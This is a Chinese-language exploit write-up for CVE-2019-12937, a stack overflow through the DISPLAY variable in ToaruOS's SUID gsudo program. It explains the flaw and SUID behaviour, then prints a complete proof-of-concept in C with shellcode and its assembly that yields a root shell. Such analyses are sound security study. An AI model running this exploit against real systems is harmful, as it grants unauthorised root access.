# CVE-2019-12937

ToaruOS是一套使用C语言编写的开源计算机操作系统，是一个由伊利诺伊大学计算机科学本科生开发的业余爱好操作系统。ToAruOS可在POSIX和x86架构上运行。ToAruOS的主要功能包括对进程和线程的支持、ELF二进制的支持、运行时加载模块、管道（Pipe）和各种类型的终端设备（TTY）的支持、虚拟文件系统的支持、EXT2文件系统的支持、信号量支持等。

ToaruOS 1.10.9及之前版本中的gsudo的apps/gsudo.c文件存在缓冲区溢出漏洞。攻击者可借助DISPLAY环境变量利用该漏洞将权限提升至root。

[ToaruOS 1.10.9项目链接](https://github.com/klange/toaruos/tree/v1.10.9)

## 攻击方式
将poc.c文件拷贝至ToaruOS系统，在拷贝目录下运行

	gcc -o poc poc.c
	./poc

## 漏洞触发位置

在pex_connect函数使用sprintf拼接字符串，但是没有判断参数target的长度，当target太长时造成了栈溢出。

	FILE * pex_connect(char * target) {
	    char tmp[100];
	    sprintf(tmp, "/dev/pex/%s", target);
	    FILE * out = fopen(tmp, "r+");
	    if (out) {
	        setbuf(out, NULL);
	    }
	    return out;
	}

其中参数target是环境变量DISPLAY的值。

	yutani_t * yutani_init(void) {
    char * server_name = getenv("DISPLAY");
    if (!server_name) {
        server_name = "compositor";
    }
    FILE * c = pex_connect(server_name);

    if (!c) {
        return NULL; /* Connection failed. */
    }
    ......
    ......
	}

在gsudo程序调用了yutani_init 函数。gsudo是一个拥有SUID权限的程序，所以gsudo执行时的权限是root，可以利用上面的溢出来提权。

	int main(int argc, char ** argv) {

        if (argc < 2) {
                return 1;
        }

        yctx = yutani_init();
    ....
    ....
	}

## SUID

SUID程序会创建s与t权限，是为了让一般用户在执行某些程序的时候，能够暂时具有该程序拥有者的权限。

下面测试一下SUID程序执行的过程。

	#include <stdio.h>
	#include <unistd.h>
	#include <stdlib.h>
	void main()
	{
		int res;
		res = setuid(0);
		printf("%d\n",res);
		system("/bin/sh");
	}

setuid函数用来设置当前用户的身份，当参数为0，设置当前进程为root。在调用setuid之后，执行shell程序，观察当前用户。

	akashic@ubuntu:~/Kanxue/CVE-2019-12937_ToaruOS$ gcc -o setuid setuid.c 
	akashic@ubuntu:~/Kanxue/CVE-2019-12937_ToaruOS$ ./setuid
	-1
	$ whoami
	akashic
	$ exit
	akashic@ubuntu:~/Kanxue/CVE-2019-12937_ToaruOS$ sudo chown root ./setuid
	[sudo] password for akashic: 
	akashic@ubuntu:~/Kanxue/CVE-2019-12937_ToaruOS$ sudo chmod u+s ./setuid
	akashic@ubuntu:~/Kanxue/CVE-2019-12937_ToaruOS$ ./setuid 
	0
	# whoami
	root
	# exit

在ToaruOS中，操作系统启动完成后，所有程序都通过执行fork到exec_elf加载，程序的权限是父进程的权限。当遇到程序具有setuid权限，设置进程权限为当前文件拥有者权限。

## 漏洞利用

此次溢出的程序发生在一个拥有SUID权限的程序，所以利用栈溢出可以进行提权操作。

ToaruOS中没有栈随机、堆随机、栈不可执行等等，这些保护机制，利用起来相当简单，但是也没有gdb一些调试工具，还是要费点心思。

通过栈溢出漏洞控制eip到我们的提权payload地址。栈上可以执行代码，栈地址也是固定的，我们通过`environ`变量把payload放到栈上。`argv`和`environ`的地址直接打印出来。

	#include <stdio.h>
	extern char **environ;
	void main(int argc, char *argv[])
	{
		printf("argv:%x\t\t\n",argv);
		printf("environ:%x\t\n",env);
		return 0;
	}

结果

	argv:		3f00c00c
	environ:	3f022010


设置环境变量的值，控制eip值到argv与environ之间，eip地址不能出现\x00字符，通过填充Nop指令绕过。
	
	#include <stdio.h>
	#include <stdlib.h>
	#include <string.h>
	#include <unistd.h>
	
	#define EIP          "\xb0\xb0\x01\x3f"
	#define EIP_DISTANCE 25U
	
	char shellcode[] = {
	  0x31, 0xc0, 0x04, 0x18, 0x31, 0xdb, 0xcd, 0x7f, 0xeb, 0x1a, 0x5b, 0x31,
	  0xc0, 0x88, 0x43, 0x07, 0x89, 0x5b, 0x08, 0x89, 0x43, 0x0c, 0x04, 0x07,
	  0x8d, 0x4b, 0x08, 0x8d, 0x53, 0x0c, 0xcd, 0x7f, 0x31, 0xc0, 0xcd, 0x7f,
	  0xe8, 0xe1, 0xff, 0xff, 0xff, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68,
	  0x68, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x00
	};
	unsigned int shellcode_length = 57;
	
	int main(void)
	{
		char payload[65536];
		char vector[8192]   = "DISPLAY=Akashic";
		char * const arg[3] = { "/bin/gsudo", "meh", NULL };
		char * const env[3] = { payload, vector, NULL };
	
		memset(payload, 'A', sizeof(payload) - shellcode_length - 1);
		payload[sizeof(payload) - shellcode_length - 1] = 0;
		strcat(payload, shellcode);
	
		for (unsigned int i = 0; i < EIP_DISTANCE; i++)
			strcat(vector, EIP);
	
		execve("/bin/gsudo", arg, env);
	
		perror("execve()");
		exit(EXIT_FAILURE);
	}

# payload

在payload首先执行`setuid(0)`设置当前进程权限，然后执行`system(/bin/shh)`返回shell。toaruOS通过`int 0x7f`调用系统函数，在`syscall_nums.h`中有系统调用号，`setuid`对应24，`system`对应7。

	    xor eax, eax
	    add al, 24
	    xor ebx, ebx
	    int 0x7f
	    jmp short end
	start:
	    pop ebx
	    xor eax, eax
	    mov [ebx+7], al
	    mov [ebx+8], ebx
	    mov [ebx+12], eax
	    add al, 7
	    lea ecx, [ebx+8]
	    lea edx, [ebx+12]
	    int 0x7f
	    xor eax, eax
	    int 0x7f
	end:
	    call start
	db "/bin/shh"
	db "XXXXXXXX"
